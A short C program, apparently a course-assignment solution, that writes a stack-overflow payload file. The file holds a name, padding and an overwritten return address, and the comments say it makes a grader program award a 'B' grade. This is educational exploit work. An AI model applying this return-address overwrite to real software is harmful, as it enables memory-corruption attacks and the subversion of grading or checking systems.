#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/*
   produces a file called dataB with the student name "AnishKKat", a null byte,
   padding to overrun the stack, and the address of the instruction in main to get a 'b'.
   this causes the grader program to give a 'B' grade, even if the provided name isn't "Andrew Appel".
*/

/*
   this main function:
   - does not take any command-line arguments.
   - does not read from stdin or any other input stream.
   - writes a specific sequence of bytes to a file named "dataB" to achieve a 'B' grade.
   - returns 0 on successful execution, or 1 if an error occurs (e.g., file cannot be opened).
*/

int main(void) {
    /* Constants defining buffer and addresses */
    const char *studentName = "AnishKKat";    /* student name to be written */
    size_t nameLength = 9;                    /* length of "AnishKKat" */
    size_t bufferSize = 48;                   /* total buffer size in bytes */
    size_t totalNameBytes = nameLength + 1;   /* name length plus null terminator */
    size_t paddingLength = bufferSize - totalNameBytes; /* number of padding bytes */
    uint64_t returnAddress = 0x400890;        /* address to overwrite return address with */

    /* Open the file "dataB" for writing in binary mode */
    FILE *filePtr = fopen("dataB", "w");
    if (!filePtr) {
        perror("Error opening dataB for writing");
        exit(1);
    }

    /* Write the student name "AnishKKat" to dataB */
    fwrite(studentName, 1, nameLength, filePtr);
    fputc('\0', filePtr); /* null terminator */

    /* Write padding bytes to overrun the stack buffer */
    for (size_t i = 0; i < paddingLength; i++) {
        fputc('\0', filePtr);
    }

    /* Overwrite the return address with the address that triggers the 'B' grade */
    fwrite(&returnAddress, sizeof(returnAddress), 1, filePtr);

    /* Close the file */
    fclose(filePtr);

    return 0;
}